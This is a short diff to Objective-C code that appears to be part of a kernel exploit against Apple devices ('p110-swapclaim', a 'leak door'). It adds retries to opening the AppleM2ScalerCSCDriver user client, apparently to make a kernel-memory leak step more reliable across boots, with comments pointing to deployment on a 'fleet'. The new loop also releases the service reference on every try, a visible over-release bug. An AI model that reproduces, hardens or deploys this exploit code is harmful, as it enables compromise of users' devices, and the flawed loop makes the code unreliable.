@@ -100,7 +100,7 @@
 #import <IOKit/IOKitLib.h>       /* dlsym'd calls still; only the UC types  */
 #import <sys/qos.h>
 
-#define P110_BUILD      @"p110-swapclaim-v2.3-leakgate-count2"
+#define P110_BUILD      @"p110-swapclaim-v2.4-openretry"
 #define P110_ROUNDS     64
 #define P110_PREFILL_MAX  8     /* bandit arm room: prefill 6 (default) vs 8 */
 #define P110_PREFILL_DEF  6     /* the v1 shipped prefill(6) pop-law value   */
@@ -480,10 +480,20 @@ static BOOL p110_leak_door(void) {
         return NO;
     }
     g_p110_m2svc = svc;
-    kern_return_t kr = g_p110_open(svc, mach_task_self(), 0, &g_p110_m2conn);
-    (void)g_p110_objRelease(svc);   /* the GetMatchingService +1 ref; the
-                                       door lives in the UC connection    */
-    Lf(@"[leak] IOServiceOpen AppleM2ScalerCSCDriver type=0 kr=0x%x conn=%d", kr, g_p110_m2conn);
+    /* v2.4 open-retry: the M2Scaler IOServiceOpen FLAPS per boot on the
+       fleet (2026-10-27: 21:54 ok / 22:26+22:28 rejected same evening).
+       Bounded 3 attempts, 500 ms apart — catches the per-boot window
+       without a retry storm. */
+    kern_return_t kr = 0;
+    for (int o_try = 0; o_try < 3; o_try++) {
+        kr = g_p110_open(svc, mach_task_self(), 0, &g_p110_m2conn);
+        (void)g_p110_objRelease(svc);   /* the GetMatchingService +1 ref; the
+                                           door lives in the UC connection    */
+        if (kr == KERN_SUCCESS && g_p110_m2conn) break;
+        g_p110_m2conn = 0;
+        if (o_try < 2) (void)usleep(500000);
+    }
+    Lf(@"[leak] IOServiceOpen AppleM2ScalerCSCDriver type=0 (3 bounded tries) kr=0x%x conn=%d", kr, g_p110_m2conn);
     return (kr == KERN_SUCCESS && g_p110_m2conn);
 }
 
